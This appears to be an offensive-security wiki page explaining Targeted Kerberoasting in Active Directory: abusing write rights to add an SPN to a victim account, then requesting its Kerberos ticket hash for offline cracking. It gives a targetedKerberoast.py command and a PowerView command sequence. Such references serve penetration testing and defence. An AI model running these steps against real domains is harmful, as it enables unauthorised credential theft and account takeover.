# Targeted Kerberoasting

This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target. A member of the [Account Operator](../domain-settings/builtin-groups.md) group usually has those permissions.

The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](../kerberos/kerberoast.md). This technique is called Targeted Kerberoasting.&#x20;

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, this can be done with [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) (Python)

```bash
targetedKerberoast.py -v -d $DOMAIN_FQDN -u $USER -p $PASSWORD
```
{% endtab %}

{% tab title="Windows" %}
From Windows machines, this can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) and [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
# Make sur that the target account has no SPN
Get-DomainUser 'victimuser' | Select serviceprincipalname

# Set the SPN
Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash
$User = Get-DomainUser 'victimuser'
$User | Get-DomainSPNTicket | fl

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```
{% endtab %}
{% endtabs %}

Once the Kerberoast hash is obtained, it can possibly be [cracked](../credentials/cracking.md) to recover the account's password if the password used is weak enough.
